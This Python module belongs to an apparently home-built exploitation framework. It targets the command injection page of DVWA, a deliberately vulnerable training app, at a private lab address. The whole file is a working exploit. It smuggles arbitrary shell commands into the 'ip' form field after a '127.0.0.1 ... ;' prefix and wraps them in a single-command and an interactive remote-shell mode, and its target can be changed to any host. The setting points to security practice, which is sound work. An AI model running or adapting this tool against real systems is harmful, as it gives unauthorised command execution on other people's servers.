import requests


class Module:
    def __init__(self):
        self.name = "cmd_injection"
        self.description = "DVWA command injection helper (shell-style execution)"
        self.target = "http://192.168.107.129"
        self.session = None
        self.logged_in = False

        self.vuln_path = "/vulnerabilities/exec/"
        self.param = "ip"
        self.prefix = "127.0.0.1 >/dev/null 2>&1; "

    def show_options(self):
        print("\nCurrent Module Options (cmd_injection):")
        print(f" target → {self.target}")
        print(f" vuln_path → {self.vuln_path}")
        print(f" param → {self.param}\n")

        print("Commands:")
        print(" show options")
        print(" set target <url>")
        print(" shell <command>   (execute one command)")
        print(" shell             (interactive mode)")
        print(" back / exit\n")

    def handle_command(self, cmd_input: str):
        cmd = cmd_input.strip()
        low = cmd.lower()

        if low == "show options":
            self.show_options()
            return

        if low.startswith("set target "):
            value = cmd.split(maxsplit=2)[2].strip()
            if not value.startswith(("http://", "https://")):
                value = "http://" + value
            self.target = value.rstrip("/")
            print(f"[+] target → {self.target}")
            return

        if low in ["back", "exit", "quit"]:
            return

        if low.startswith("shell"):
            parts = cmd.split(maxsplit=1)
            if len(parts) == 1:
                self._interactive_shell()
            else:
                out = self.exec(parts[1])
                if out is not None:
                    print(out.rstrip())
            return

        print("Unknown command. Try 'show options'.")

    def _interactive_shell(self):
        print("[*] Entering cmd_injection shell (type 'exit' to leave)")
        while True:
            try:
                line = input("cmdinj$ ").strip()
                if line.lower() in ["exit", "quit", "back"]:
                    break
                if not line:
                    continue
                out = self.exec(line)
                if out is not None:
                    print(out.rstrip())
            except KeyboardInterrupt:
                print()
                break

    def exec(self, command: str):
        if not self.session:
            print("[-] No session set. In web_exploit, run 'setup' first.")
            return None

        url = f"{self.target}{self.vuln_path}"
        payload = f"{self.prefix}{command}"
        data = {self.param: payload, "Submit": "Submit"}

        r = self.session.post(url, data=data, timeout=15)

        # DVWA often returns output within <pre> tags.
        text = r.text
        start = text.find("<pre>")
        end = text.find("</pre>", start + 5) if start != -1 else -1
        if start != -1 and end != -1:
            return text[start + 5:end]

        return r.text
